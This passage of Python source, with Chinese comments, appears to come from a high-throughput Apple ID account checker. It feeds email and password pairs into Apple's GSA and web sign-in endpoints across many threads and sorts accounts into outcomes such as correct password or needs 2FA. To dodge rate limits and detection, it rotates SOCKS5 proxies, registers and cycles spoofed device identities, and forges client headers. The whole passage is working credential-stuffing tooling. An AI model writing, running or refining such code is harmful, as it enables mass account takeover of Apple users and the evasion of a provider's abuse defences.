                    phase='ready', message='代理和设备已就绪，正在启动工作线程')
            ms = None
            payload = {
                'started': time.strftime('%H:%M:%S', time.localtime(wall_started)),
                'elapsed': round(elapsed, 1),
                'total': results['total'], 'done': done,
                'rate': round(done / elapsed, 2) if elapsed else 0,
                'per_hour': round(done / elapsed * 3600) if elapsed else 0,
                'eta': round((results['total'] - done) / (done / elapsed), 0)
                       if done and elapsed else None,
                'threads': args.threads, 'processes': 1, 'backend': SRP_MATH_BACKEND,
                'engine': 'threading',
                'accounts': args.accounts,
                'cpu_seconds': round(cpu, 2),
                'cpu_cores': round(cpu / elapsed, 3) if elapsed else 0,
                'cpu_per_account': round(cpu / done * 1000, 1) if done else 0,
                # 进程口径：包含所有线程（业务 + supplier + 主线程），单进程时可信
                'proc_cpu_seconds': round(time.process_time() - proc_cpu_start, 2),
                'proc_cpu_cores': round((time.process_time() - proc_cpu_start) / elapsed, 3)
                                   if elapsed else 0,
                'ip_fail': results['ip_fail'],
                'ip_pool': pool_snapshot,
                'startup': startup_snapshot,
                'retried': results.get('retried', 0),
                'budget_hit': results.get('budget_hit', 0),
                'by_retry': results.get('by_retry') or {},
                'otp_hit': results.get('otp_hit', 0),
                'writer_cpu': round(time.thread_time() - wcpu0, 2),
                'main_cpu': round(time.thread_time() - main_cpu0, 2),
                'otp_fetch': results.get('otp_fetch', 0),
                'device_ready': device_registered,  # 兼容旧页面/旧汇总器
                'device_registered': device_registered,
                'device_in_use': device_in_use,
                'device_registering': device_registering,
                'device_retired': results.get('device_retired', 0),
                'register_errors': register_errors,
                'register_error_types': register_error_types,
                'seg': {k: (round(sorted(v)[len(v)//2],1) if v else None)
                        for k, v in (results.get('seg') or {}).items()},
                'by_status': by_status,
                'by_web': results.get('by_web') or {},
                'cross': results.get('cross') or {},
                'by_method': results.get('by_method') or {},
                'p50': cached['p50'],
                'p90': cached['p90'],
                'latency_hist': latency_hist,
                'sample_count': len(samples),
                'recent': recent,
            }
            tmp = path + '.tmp'
            try:
                with open(tmp, 'w', encoding='utf-8') as handle:
                    json.dump(payload, handle, ensure_ascii=False)
                os.replace(tmp, path)
            except OSError:
                pass
            stop.wait(1.0)

    def startup_heartbeat():
        """Publish a lightweight startup frame until the first result exists."""
        while not stop.is_set() and not first_result.is_set():
            with startup_runtime_lock:
                runtime = dict(startup_runtime)
            with device_pool_cv:
                ready = int(device_inventory['ready'])
                registering = int(device_inventory['registering'])
            pool = ip_pool.snapshot() if ip_pool is not None else {}
            workers_started = int(runtime['workers_started'])
            header_ready = int(runtime['public_header_ready'])
            header_waiting = int(runtime['public_header_waiting'])
            if workers_started:
                phase = 'public_header'
                message = (f'正在获取公共头（就绪 {header_ready}/'
                           f'{workers_started}，并发上限 {anisette_limit}）')
            else:
                phase = 'device_register'
                message = f'代理池就绪，正在分配设备（{ready}/{active_workers}）'
            snapshot = dict(
                startup_state, phase=phase, message=message,
                elapsed=round(time.monotonic() - startup_started, 1),
                device_loaded=loaded_devices, device_ready=ready,
                device_target=active_workers, device_registering=registering,
                workers_started=workers_started,
                public_header_waiting=header_waiting,
                public_header_ready=header_ready,
                public_header_retries=results.get('public_header_retries', 0),
                public_header_limit=anisette_limit,
                proxy_fetched=int(pool.get('fetched') or 0),
                proxy_available=int(pool.get('available') or 0),
                proxy_api_calls=int(pool.get('api_calls') or 0))
            try:
                write_startup_live(
                    args.live, snapshot, total=len(rows), threads=args.threads,
                    accounts=args.accounts, elapsed=snapshot['elapsed'])
            except OSError:
                pass
            first_result.wait(0.5)

    def register_worker_device(tid):
        """Let the business thread create and keep its own missing device.

        Persisted slots are already partitioned by run_mp.  When this process
        has no idle assigned slot, the waiting business thread reserves the
        next process-local slot, registers it with its own SOCKS5 route, marks
        it ready, and keeps the lease until its task loop ends.  The account
        queue is untouched until the registered public header is available.
        """
        if args.no_register or stop.is_set() or pending_task_count() <= 0:
            return None
        owner = int(tid)
        with device_pool_cv:
            device_inventory['registering'] += 1
        lease = device_pool.reserve_new_worker_slot()
        slot = lease.slot
        profile = device_profile(device_pool, slot) if not args.no_fix_os else None
        with lock:
            results['device_registering'].add(slot)
        failures = 0
        success = False
        proxy = None
        proxy_exp = 0.0
        try:
            while not stop.is_set() and pending_task_count() > 0:
                # A timed-out provider call may still have atomically persisted
                # a complete identity, so always inspect the same reserved slot.
                if device_pool.inspect(slot).get('state') == 'ready':
                    device_pool.mark_worker_slot_ready(slot)
                    success = True
                    break
                if args.anisette_proxy:
                    if ip_pool is not None:
                        proxy, proxy_exp = ip_pool.acquire(
                            owner, wait=max(1.0, float(args.register_timeout)))
                    elif proxy is None:
                        proxy = (fetch_one_ip(args.api) if args.no_precheck
                                 else fetch_usable_ip(args.api, args.precheck_timeout))
                        proxy_exp = (time.monotonic() + args.ip_ttl
                                     if proxy else 0.0)
                    if not proxy:
                        with lock:
                            results['register_errors'] += 1
                            kinds = results['register_error_types']
                            kinds['no_proxy'] = kinds.get('no_proxy', 0) + 1
                        failures += 1
                        stop.wait(min(8.0, 0.25 * (2 ** min(failures, 5))))
                        continue
                try:
                    info = _shared_device_info(
                        device_pool, profile, info_cache, info_gate,
                        max(1.0, float(args.register_timeout)), proxy=proxy,
                        provider_direct=proxy is None)
                    device_pool.fetch_headers(
                        slot, info, max(1.0, float(args.register_timeout)),
                        registered=False, proxy=proxy,
                        provider_direct=proxy is None)
                    device_pool.mark_worker_slot_ready(slot)
                    if ip_pool is not None and proxy:
                        ip_pool.release(owner, proxy, proxy_exp, healthy=True)
                    proxy = None
                    success = True
                    break
                except Exception as exc:                       # noqa: BLE001
                    if ip_pool is not None and proxy:
                        ip_pool.release(owner, proxy, proxy_exp, healthy=False)
                    proxy = None
                    stage = str(getattr(exc, 'stage', '') or type(exc).__name__)
                    http = int(getattr(exc, 'http', 0) or 0)
                    reason = f'{stage}:HTTP{http}' if http else stage
                    with lock:
                        results['register_errors'] += 1
                        kinds = results['register_error_types']
                        kinds[reason] = kinds.get(reason, 0) + 1
                    failures += 1
                    stop.wait(min(8.0, 0.25 * (2 ** min(failures, 5)))
                              + random.uniform(0.0, 0.25))
        finally:
            if ip_pool is not None and proxy:
                ip_pool.release(owner, proxy, proxy_exp, healthy=False)
            with lock:
                results['device_registering'].discard(slot)
                if success:
                    results['device_ready'].add(slot)
            with device_pool_cv:
                device_inventory['registering'] -= 1
                if success:
                    device_inventory['ready'] += 1
                device_pool_cv.notify_all()
        if success:
            return lease
        lease.close()
        return None

    def worker(tid):
        if pending_task_count() <= 0:
            return
        # ---- 1) 设备：先拿本进程已分配设备，拿不到就由本线程注册 ----
        boot = {}
        _b0 = time.thread_time()
        pool = device_pool
        slot_lease = pool.acquire_ready_worker_slot()
        if slot_lease is None:
            slot_lease = register_worker_device(tid)
        if slot_lease is None:
            return
        slot = slot_lease.slot
        with lock:
            worker_leases[tid] = slot_lease
            results['device_in_use'].add(slot)
            results['workers_started'] += 1
        with startup_runtime_lock:
            startup_runtime['workers_started'] += 1
        boot['pool_ctor'] = (time.thread_time() - _b0) * 1000
        _b0 = time.thread_time()
        profile = device_profile(pool, slot) if not args.no_fix_os else None
        boot['profile'] = (time.thread_time() - _b0) * 1000

        # ---- 2) 设备就绪后再领业务 IP，避免等待设备时把短 TTL IP 放过期 ----
        proxy = None
        if ip_pool is None:
            # 非池模式：线程自取一条，全程复用
            if args.no_precheck:
                for _ in range(8):
                    proxy = fetch_one_ip(args.api)
                    if proxy:
                        break
                    time.sleep(0.5)
            else:
                proxy = fetch_usable_ip(args.api, args.precheck_timeout)
            if not proxy:
                with lock:
                    results['ip_fail'] += 1
                return

        def acquire_anisette_route(wait):
            """注册/公共头都用线程自己的代理；池模式失败后可换下一条。"""
            nonlocal proxy
            if not args.anisette_proxy:
                return None, 0.0
            if ip_pool is not None:
                return ip_pool.acquire(tid, wait=max(0.0, min(60.0, wait)))
            if proxy is None:
                proxy = (fetch_one_ip(args.api) if args.no_precheck
                         else fetch_usable_ip(args.api, args.precheck_timeout))
            return proxy, time.monotonic() + args.ip_ttl if proxy else 0.0

        def release_anisette_route(route, expires, healthy):
            nonlocal proxy
            if ip_pool is not None:
                ip_pool.release(tid, route, expires, healthy=healthy)
            elif route and not healthy:
                proxy = None

        # 设备已经由生产者注册完成；业务线程只准备进程共享的客户端信息。
        _info_cpu = 0.0
        _w0 = time.perf_counter()
        info = None
        setup_failures = 0
        while not stop.is_set():
            reg_proxy, reg_exp = acquire_anisette_route(args.register_timeout)
            if args.anisette_proxy and not reg_proxy:
                setup_failures += 1
                delay = (min(8.0, 0.25 * (2 ** min(setup_failures, 5)))
                         + random.uniform(0.0, 0.25))
                stop.wait(delay)
                continue
            try:
                _b0 = time.thread_time()
                info = _shared_device_info(
                    pool, profile, info_cache, info_gate,
                    max(1.0, max(args.timeout, 20)), proxy=reg_proxy,
                    provider_direct=reg_proxy is None)
                _info_cpu += (time.thread_time() - _b0) * 1000
                release_anisette_route(reg_proxy, reg_exp, True)
                break
            except Exception as exc:                           # noqa: BLE001
                release_anisette_route(reg_proxy, reg_exp, False)
                setup_failures += 1
                delay = (min(8.0, 0.25 * (2 ** min(setup_failures, 5)))
                         + random.uniform(0.0, 0.25))
                stop.wait(delay)
        if info is None:
            return
        boot['info'] = _info_cpu
        boot['register_cpu'] = 0.0
        boot['register_wall'] = (time.perf_counter() - _w0) * 1000
        # ---- 2.5) 公共头客户端：建一次，之后只发 POST ----
        # 直连时复用 Client；代理模式每次刷新公共头都用当前线程正在使用的
        # 代理，避免把一个 60 秒代理固定缓存到整个长任务。
        _b0 = time.thread_time()
        cached_client = None
        startup_header_pending = False
        startup_header_ready = False
        if not args.no_client_cache and not args.anisette_proxy:
            from fastcheck.protocols.anisette_v3 import Client
            cached_client = Client(
                'https://new.ani.sidestore.io',
                timeout=max(args.timeout, 20),
                store=pool.store(slot, registered=True),
                client_info=dict(info),
                provider_direct=True)
            cached_client.deadline = time.monotonic() + max(args.timeout, 20)
        boot['client_ctor'] = (time.thread_time() - _b0) * 1000

        def fetch_otp():
            """两条路径都必须过同一个并发闸门，否则 anisette-workers 形同虚设。

            注意：给 anisette 传了 client_info 之后，它就不再回传
            X-MMe-Client-Info；必须把 profile 里的型号补回 identity，
            否则 gs.check 会带着空的设备头去打 Apple。
            """
            nonlocal startup_header_pending, startup_header_ready
            if not startup_header_ready and not startup_header_pending:
                startup_header_pending = True
                with lock:
                    results['public_header_waiting'] += 1
                with startup_runtime_lock:
                    startup_runtime['public_header_waiting'] += 1
            try:
                if cached_client is not None:
                    with anisette_gate:
                        # 同一个配置值，每个工作线程拥有独立 deadline。
                        cached_client.deadline = (time.monotonic()
                                                  + max(1.0, args.anisette_timeout))
                        raw = cached_client.headers()
                else:
                    with anisette_gate:
                        raw = pool.fetch_headers(
                            slot, info, max(1.0, args.anisette_timeout), registered=True,
                            proxy=proxy if args.anisette_proxy else None,
                            provider_direct=not args.anisette_proxy)
            except BaseException:
                # 只淘汰当前线程失败的 SOCKS5 路由。外层循环会为同一
                # 线程重新拿代理、重新取公共头，而且尚未消费任何账号。
                with lock:
                    results['public_header_retries'] += 1
                if startup_header_pending:
                    startup_header_pending = False
                    with lock:
                        results['public_header_waiting'] = max(
                            0, results['public_header_waiting'] - 1)
                    with startup_runtime_lock:
                        startup_runtime['public_header_waiting'] = max(
                            0, startup_runtime['public_header_waiting'] - 1)
                raise
            if startup_header_pending:
                startup_header_pending = False
                with lock:
                    results['public_header_waiting'] = max(
                        0, results['public_header_waiting'] - 1)
                    if not startup_header_ready:
                        results['public_header_ready'] += 1
                with startup_runtime_lock:
                    startup_runtime['public_header_waiting'] = max(
                        0, startup_runtime['public_header_waiting'] - 1)
                    if not startup_header_ready:
                        startup_runtime['public_header_ready'] += 1
                startup_header_ready = True
                first_public_header.set()
            if profile and isinstance(raw, dict):
                raw = dict(raw)
                raw['X-MMe-Client-Info'] = profile['client_info']
                raw['X-Mme-Client-Info'] = profile['client_info']
                raw.setdefault('User-Agent', profile['user_agent'])
            return raw

        # ---- 3) 循环验证：每 per_ip 条换 IP，每 otp_reuse 条换公共头 ----
        local_retries = {}
        retry_tasks = []
        with lock:
            bag = results.setdefault('boot_segments', {})
            for k, v in boot.items():
                bag.setdefault(k, []).append(v)
        cpu_start = time.thread_time()
        mine = 0
        device_exhausted = False
        while not stop.is_set():
            # 池模式每轮重新领一条；非池模式保留线程启动时取得的固定代理。
            proxy_exp = 0.0
            t_ip = time.perf_counter()
            if ip_pool is not None:
                proxy, proxy_exp = ip_pool.acquire(tid, wait=60.0)
            ip_ms = (time.perf_counter() - t_ip) * 1000
            if proxy is None:
                with lock:
                    results['ip_fail'] += 1
                # 代理池短暂断货不能消费账号；保留共享队列等待补池。
                pending = len(retry_tasks) + pending_task_count()
                if not wait_for_proxy_when_tasks_remain(pending, stop.is_set()):
                    break
                stop.wait(0.5 + random.uniform(0.0, 0.5))
                continue
            served = ok_count = 0
            proxy_failed = False
            t_prev_end = time.perf_counter()      # 上一轮记录完的时刻
            while served < args.per_ip and not stop.is_set():
                t_loop = time.perf_counter()
                gap_ms = (t_loop - t_prev_end) * 1000   # 轮与轮之间的空档
                pending = len(retry_tasks) + pending_task_count()
                if not wait_for_proxy_when_tasks_remain(pending, stop.is_set()):
                    break
                t_otp = time.perf_counter()
                c0_otp = time.thread_time()
                otp_cpu = chk_cpu = 0.0
                otp_metric = None
                # 先确保设备公共头可用，再领取账号。公共头故障只影响线程，
                # 不得生成账号结果或从队列移除账号。
                try:
                    identity = device_headers.take(slot, args.otp_reuse)
                    if identity is None:
                        identity = fetch_otp()
                        device_headers.bind_used(
                            slot, identity,
                            max(10.0, min(60.0, float(args.ip_ttl))),
                            args.otp_reuse)
                        otp_metric = 'fetch'
                    else:
                        otp_metric = 'hit'
                except Exception as exc:                           # noqa: BLE001
                    with lock:
                        kinds = results['register_error_types']
                        key = f'public_header:{type(exc).__name__}'
                        kinds[key] = kinds.get(key, 0) + 1
                    device_headers.invalidate(slot)
                    if args.anisette_proxy:
                        proxy_failed = True
                        break
                    stop.wait(anisette_retry_delay(0))
                    continue
                otp_ms = (time.perf_counter() - t_otp) * 1000
                otp_cpu = (time.thread_time() - c0_otp) * 1000
                task = retry_tasks.pop() if retry_tasks else take_task()
                if task is None:
                    break
                email, password = task
                task_key = (email, password)
                local_retry_count = local_retries.get(task_key, 0)
                t0 = time.perf_counter()
                cpu0 = time.thread_time()
                attempts = 0
                retry_reason = ''
                budget_hit = False
                attempt_ms = []                 # 每次 gs.check 的实际墙钟耗时
                budget_left_ms = None            # 预算耗尽时还剩多少（负数=超出）
                retry_ip_ms = []                 # 重试换 IP 时 ip_pool.acquire 的等待耗时
                ip_wait_none = False             # 重试里是否因为「等不到 IP」而中断
                budget = max(1.0, float(args.item_timeout))
                gsa_started = False
                try:
                    # ---- 外层重试：只有链路/环境问题才换环境重来 ----
                    attempts = 0
                    t_chk = time.perf_counter()
                    c0_chk = time.thread_time()
                    # 预算从 OTP 之后开始算：慢的 anisette 不该吃掉 GSA 重试预算。
                    # 之前 deadline = t0 + budget 把 fetch_otp 耗时也算进 20s，
                    # 导致 OTP 一慢就「attempts=1 + 单条预算用尽」。
                    deadline = time.perf_counter() + budget
                    budget_hit = False
                    while True:
                        attempts += 1
                        remain = deadline - time.perf_counter()
                        if remain < 1.0:
                            # 预算耗尽：不再发请求，直接判超时
                            result = {'status': 'timeout', 'kind': 'budget',
                                      'detail': f'单条预算 {budget:.0f}s 用尽', 'http': 0}
                            budget_hit = True
                            retry_reason = 'budget'
                            break
                        # gs.check 内部有 init + complete 两跳，每跳读超时 per_hop，
                        # 与 gsa-console 使用相同阈值：每个 GSA 请求独立获得
                        # connect/read 时间，不再把账号总预算切碎到剩余重试和两跳。
                        per_hop = max(1.0, float(args.timeout))
                        _a0 = time.perf_counter()
                        gsa_started = True
                        result = gs.check(email, password, proxy,
                                          timeout=per_hop,
                                          retries=0, identity=identity)
                        attempt_ms.append(round((time.perf_counter() - _a0) * 1000, 1))
                        probe_status = refine_status(result, result_bucket(result))
                        kind, why = retry_kind(result, probe_status)
                        if kind is not None:
                            proxy_failed = True
                        if kind is None or attempts > args.retry or stop.is_set():
                            if attempts > args.retry:
                                finalize_retry_exhausted(result)
                            retry_reason = why if attempts > 1 else ''
                            break
                        retry_reason = why
                        # 换 IP：归还当前这条（标记为坏），取新的
                        if ip_pool is not None:
                            _t_ip = time.perf_counter()
                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
                            proxy, proxy_exp = ip_pool.acquire(tid, wait=20.0)
                            proxy_failed = False
                            retry_ip_ms.append(round((time.perf_counter() - _t_ip) * 1000, 1))
                            if proxy is None:
                                ip_wait_none = True
                                break
                        # 环境异常（-22421）还要顺带换一个公共头
                        if kind == RETRY_ENV:
                            device_headers.invalidate(slot)
                            try:
                                identity = fetch_otp()
                                device_headers.bind_used(
                                    slot, identity,
                                    max(10.0, min(60.0, float(args.ip_ttl))),
                                    args.otp_reuse)
                                otp_metric = 'fetch'
                            except Exception:
                                pass
                        served = max(0, served - 1)   # 重试不占 per_ip 配额
                    chk_ms = (time.perf_counter() - t_chk) * 1000
                    chk_cpu = (time.thread_time() - c0_chk) * 1000
                    if budget_hit:
                        budget_left_ms = round((deadline - time.perf_counter()) * 1000, 1)
                except Exception as exc:                            # noqa: BLE001
                    otp_ms = chk_ms = 0.0
                    otp_cpu = chk_cpu = 0.0
                    result = local_exception_result(exc)
                    previous = local_retries.get(task_key, 0)
                    attempts = 1
                    # 公共头/代理等本地链路异常以前会直接吞成“其他”。现在
                    # 清掉可能损坏的公共头，换出口后把同一账号放回本线程，
                    # 最多按 --retry 重试；程序错误仍保留为可诊断的“其他”。
                    if (result.get('status') == 'timeout' and previous < args.retry
                            and not stop.is_set()):
                        local_retries[task_key] = previous + 1
                        device_headers.invalidate(slot)
                        replacement = proxy
                        used_proxy = local_exception_used_proxy(
                            gsa_started, args.anisette_proxy)
                        if not used_proxy:
                            # 直连公共头故障与任务代理无关。像 gsa-console
                            # 一样延迟重试，并加随机抖动防止1000线程同时重连。
                            delay = anisette_retry_delay(previous)
                            stop.wait(delay)
                        if ip_pool is not None and used_proxy:
                            proxy_failed = True
                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
                            replacement, proxy_exp = ip_pool.acquire(tid, wait=20.0)
                            proxy_failed = False
                        elif args.api and used_proxy:
                            replacement = (fetch_one_ip(args.api) if args.no_precheck
                                           else fetch_usable_ip(args.api, args.precheck_timeout))
                        if replacement is not None:
                            proxy = replacement
                            retry_tasks.append((email, password))
                            continue
                    local_retries.pop(task_key, None)
                if local_retry_count:
                    attempts += local_retry_count
                    retry_reason = retry_reason or 'local_http=0'
                    local_retries.pop(task_key, None)
                elapsed = (time.perf_counter() - t0) * 1000
                thread_cpu = (time.thread_time() - cpu0) * 1000
                c0_tail = time.thread_time()
                raw_status = str(result.get('status') or 'error')
                status = refine_status(result, result_bucket(result))
                bucket_cpu = (time.thread_time() - c0_tail) * 1000
                try:
                    got_http = int(result.get('http') or 0)
                except (TypeError, ValueError):
                    got_http = 0
                if got_http:
                    ok_count += 1
                web = {}
                web_status = web_ec = None
                web_detail = ''
                web_method = None
                web_auth = ''
                web_attempts = 0
                web_proxy_rotations = 0
                web_rotation_exhausted = False
                web_ms = 0.0
                final_status = status
                overridden = False
                # 只对 au=repair 复核：GSA 的 au 是个大伞，只说"要继续验证"，
                # 具体是验证码还是安全修复不明确，才值得用 web 细化一次。
                # au=hsa/hsa2 本身就是明确的验证码流程，不做复核。
                auth_type = str(result.get('auth_type') or '').strip().casefold()
                wants_web = (bool(args.verify_web) and status == 'need_2fa'
                             and auth_type == 'repair')
                if wants_web:
                    from fastcheck.protocols import idmsa
                    wt0, wc0 = time.perf_counter(), time.thread_time()
                    web_trace = {}
                    for web_attempt in range(max(0, int(args.retry)) + 1):
                        web_trace = {}

                        def remember_web_trace(entry):
                            if not isinstance(entry, dict):
                                return
                            stage = str(entry.get('stage') or '')
                            if stage in ('init', 'complete'):
                                web_trace[stage] = {
                                    'http': entry.get('http'),
                                    'auth_type': entry.get('auth_type'),
                                }
                        web_attempts += 1
                        try:
                            web = idmsa.check(email, password, proxy,
                                              timeout=args.web_timeout, retries=0,
                                              trace=remember_web_trace)
                            web_ec = web.get('apple_ec')
                            web_status = classify_web(web, web_trace)
                            web_detail = str(web.get('detail') or '')[:120]
                        except Exception as exc:                    # noqa: BLE001
                            web = {}
                            web_status = 'web_error'
                            web_detail = type(exc).__name__
                        if not web_retryable(web_status):
                            break
                        proxy_failed = True
                        if web_attempt >= max(0, int(args.retry)) or stop.is_set():
                            break
                        replacement = None
                        if ip_pool is not None:
                            _t_ip = time.perf_counter()
                            ip_pool.release(tid, proxy, proxy_exp, healthy=False)
                            proxy = None
                            proxy_exp = 0.0
                            replacement, proxy_exp = ip_pool.acquire(tid, wait=20.0)
                            retry_ip_ms.append(round((time.perf_counter() - _t_ip) * 1000, 1))
                        elif args.api:
                            replacement = (fetch_one_ip(args.api) if args.no_precheck
                                           else fetch_usable_ip(args.api, args.precheck_timeout))
                        if replacement is None:
                            web_rotation_exhausted = True
                            break
                        proxy = replacement
                        proxy_failed = False
                        web_proxy_rotations += 1
                    web_ms = round((time.perf_counter() - wt0) * 1000, 1)
                    thread_cpu += (time.thread_time() - wc0) * 1000
                    elapsed = (time.perf_counter() - t0) * 1000
                    web_auth = web_auth_type(web, web_trace)
                    web_method = classify_web_method(web, web_trace)
                    # sa/non-sa 表示 Web 已完成 SRP 密码验证；与
                    # cluster-lab 一致归入“密码正确”。其他 Web
                    # 结果只做细分，不覆盖 GSA 结论。
                    final_status = refine_repair_web_status(status, web, web_trace)
                    overridden = final_status != status
                device_meta = pool.worker_slot_result_metadata(slot)
                row = {'tid': tid, 'slot': slot, 'email': email,
                       **device_meta,
                       'device_limit': max(0, int(args.device_max_uses or 0)),
                       'raw_status': raw_status,
                       'proxy': _proxy_host(proxy),
                       'status': final_status, 'gsa_status': status,
                       'final': final_status,
                       'overridden': overridden,
                       'ec': result.get('apple_ec'),
                       'detail': str(result.get('apple_message')
                                     or result.get('detail') or '')[:160],
                       'http': result.get('http'), 'ms': round(elapsed, 1),
                       'thread_cpu_ms': round(thread_cpu, 2),
                       'attempts': attempts, 'retry_reason': retry_reason,
                       'budget_hit': budget_hit,
                       'attempt_ms': attempt_ms, 'budget_left_ms': budget_left_ms,
                       'retry_ip_ms': retry_ip_ms, 'ip_wait_none': ip_wait_none,
                       'ip_ms': round(ip_ms, 1), 'otp_ms': round(otp_ms, 1),
                       'chk_ms': round(chk_ms, 1), 'gap_ms': round(gap_ms, 2),
                       'web_status': web_status, 'web_ec': web_ec,
                       'web_detail': web_detail, 'web_method': web_method,
                       'web_auth_type': web_auth,
                       'web_attempts': web_attempts,
                       'web_proxy_rotations': web_proxy_rotations,
                       'web_rotation_exhausted': web_rotation_exhausted,
                       'web_ms': round(web_ms, 1)}
                line = json.dumps(row, ensure_ascii=False)
                budget_line = None
                if budget_hit:
                    budget_line = json.dumps({
                        'at': time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime()),
                        'tid': tid, 'slot': slot, 'email': email,
                        'proxy': row['proxy'],
                        'budget_ms': round(budget * 1000, 1),
                        'otp_ms': round(otp_ms, 1), 'chk_ms': round(chk_ms, 1),
                        'ip_ms': round(ip_ms, 1), 'gap_ms': round(gap_ms, 2),
                        'attempts': attempts, 'attempt_ms': attempt_ms,
                        'budget_left_ms': budget_left_ms,
                        'retry_reason': retry_reason,
                        'retry_ip_ms': retry_ip_ms,
                        'ip_wait_ms': round(sum(retry_ip_ms), 1),
                        'ip_wait_none': ip_wait_none,
                    }, ensure_ascii=False) + '\n'
                batch = None
                with lock:
                    results['done'] += 1
                    results['cpu'] += thread_cpu / 1000.0
                    results['by_status'][final_status] = results['by_status'].get(final_status, 0) + 1
                    results.setdefault('by_raw', {})
                    results['by_raw'][raw_status] = results['by_raw'].get(raw_status, 0) + 1
                    seg = results.setdefault('seg', {'ip': [], 'otp': [], 'chk': [],
                                                     'gap': [], 'loop': [],
                                                     'chk_cpu': [], 'bucket_cpu': [],
                                                     'otp_cpu': [], 'tail_cpu': []})
                    seg['chk_cpu'].append(chk_cpu)
                    seg['bucket_cpu'].append(bucket_cpu)
                    seg['otp_cpu'].append(otp_cpu)
                    seg['tail_cpu'].append(max(0.0, thread_cpu - chk_cpu
                                               - bucket_cpu - otp_cpu))
                    seg['gap'].append(gap_ms)
                    seg['loop'].append((time.perf_counter() - t0) * 1000)
                    seg['ip'].append(ip_ms)
                    seg['otp'].append(otp_ms)
                    if otp_metric == 'hit':
                        results['otp_hit'] = results.get('otp_hit', 0) + 1
                    elif otp_metric == 'fetch':
                        results['otp_fetch'] = results.get('otp_fetch', 0) + 1
                    seg['chk'].append(chk_ms)
                    if budget_hit:
                        results['budget_hit'] = results.get('budget_hit', 0) + 1
                    if attempts > 1:
                        results['retried'] = results.get('retried', 0) + 1
                        rk = results.setdefault('by_retry', {})
                        rk[retry_reason or '?'] = rk.get(retry_reason or '?', 0) + 1
                    if web_method:
                        results.setdefault('by_method', {})
                        results['by_method'][web_method] = results['by_method'].get(web_method, 0) + 1
                    if web_status:
                        results.setdefault('by_web', {})
                        results['by_web'][web_status] = results['by_web'].get(web_status, 0) + 1
                        http_tag = str(web.get('http') or '')
                        key = f'{status} → {web_status}' + (f' (HTTP {http_tag})' if http_tag else '')
                        results.setdefault('cross', {})
                        results['cross'][key] = results['cross'].get(key, 0) + 1
                    if results['done'] % 10 == 0:
                        results['samples'].append(row)
                    latency_bucket = max(0, int(round(elapsed)))
                    latency_hist = results['latency_hist']
                    latency_hist[latency_bucket] = latency_hist.get(latency_bucket, 0) + 1
                    if len(results['recent']) >= 12:
                        results['recent'].popleft()
                    results['recent'].append(row)
                    write_buffer.append(line)
                    if len(write_buffer) >= 200:        # 200 条才落一次盘
                        batch = write_buffer[:]
                        write_buffer.clear()
                first_result.set()
                if budget_line is not None:
                    with budget_lock:
                        budget_sink.write(budget_line)
                        budget_sink.flush()
                if batch is not None:                   # 序列化和落盘都在状态锁外
                    with sink_lock:
                        sink.write('\n'.join(batch) + '\n')
                        sink.flush()
                served += 1
                mine += 1
                if pool.consume_worker_slot(slot, args.device_max_uses):
                    # The just-finished account is the final allowed use.
                    # Discard the slot-bound public header before this worker
                    # starts a fresh device session.
                    device_headers.invalidate(slot)
                    with lock:
                        results['device_retired'] += 1
                        results['device_ready'].discard(slot)
                        results['device_in_use'].discard(slot)
                    with device_pool_cv:
                        device_inventory['ready'] = max(
                            0, device_inventory['ready'] - 1)
                        device_pool_cv.notify_all()
                    device_exhausted = True
                t_prev_end = time.perf_counter()
                if proxy_failed or device_exhausted:
                    break
            if ip_pool is not None:
                ip_pool.release(
                    tid, proxy, proxy_exp,
                    healthy=(ok_count > 0 or not proxy_failed))
            if served == 0:
                if not retry_tasks and pending_task_count() <= 0:
                    break
                stop.wait(0.5 + random.uniform(0.0, 0.5))
            if device_exhausted:
                break
        with lock:
            spent = (time.thread_time() - cpu_start) * 1000
            results['per_thread_cpu'].append(round(spent, 1))
            results['per_thread_count'].append(mine)
        return 'rotate' if device_exhausted else None

    results['started'] = started
    live_thread = threading.Thread(target=live_writer, name='live', daemon=True)
    live_thread.start()
    startup_thread = threading.Thread(
        target=startup_heartbeat, name='startup-live', daemon=True)
    startup_thread.start()
    def worker_guarded(tid):
        def release_session():
            with lock:
                slot_lease = worker_leases.pop(tid, None)
            slot = slot_lease.slot if slot_lease is not None else None
            with lock:
                if slot is not None:
                    results['device_registering'].discard(slot)
                    results['device_in_use'].discard(slot)
            if slot_lease is not None:
                slot_lease.close()
                with device_pool_cv:
                    device_pool_cv.notify_all()
        while not stop.is_set() and pending_task_count() > 0:
            try:
                outcome = worker(tid)
            except BaseException as exc:                           # noqa: BLE001
                import traceback
                with lock:
                    results.setdefault('worker_errors', []).append(
                        f'{type(exc).__name__}: {exc}')
                traceback.print_exc()
                release_session()
                break
            release_session()
            if outcome != 'rotate':
                break

    threads = [threading.Thread(target=worker_guarded, args=(i,), name=f'w{i}', daemon=True)
               for i in range(active_workers)]
    batches = startup_worker_batches(active_workers)
    if batches:
        first_batch = batches[0]
        for index in first_batch:
            threads[index].start()
        if len(batches) > 1:
            print(f'启动探路批 {len(first_batch)} 个工作线程；首个公共头就绪后快速扩容至 '
                  f'{active_workers}（不限制最终并发）')
            first_public_header.wait(
                min(10.0, max(2.0, float(args.anisette_timeout))))
            for batch in batches[1:]:
                for index in batch:
                    threads[index].start()
                # Once one public header succeeds, reach full concurrency fast.
                # A slow provider still gets a short stagger instead of the
                # original synchronized cold-start storm.
                stop.wait(0.05 if first_public_header.is_set() else 0.25)
    for thread in threads:
        thread.join()
    stop.set()
    first_result.set()
    first_public_header.set()
    with device_pool_cv:
        device_pool_cv.notify_all()
    wall = time.perf_counter() - started
    with lock:
        if write_buffer:
            sink.write('\n'.join(write_buffer) + '\n')
            write_buffer.clear()
    sink.close()
    try:
        budget_sink.close()
    except OSError:
        pass
    stop.set()
    live_thread.join(timeout=3)      # 必须等写线程退出，否则它会覆盖最终状态
    startup_thread.join(timeout=3)
    done_now = results['done']
    expected_now = len(rows)
    results['incomplete'] = max(0, expected_now - done_now)
    # The periodic writer may have emitted its last snapshot while workers
    # were still finishing.  Persist the authoritative final counters/rows.
    with lock:
        final_progress = final_progress_fields(results)
    try:
        with open(args.live, encoding='utf-8') as handle:
            final = json.load(handle)
        # 状态必须由"实际完成数 vs 预期数"决定，不能无条件标完成
        final['finished'] = results['incomplete'] == 0
        final['status'] = 'complete' if results['incomplete'] == 0 else 'incomplete'
        final['expected'] = expected_now
        final['done'] = done_now
        final.update(final_progress)
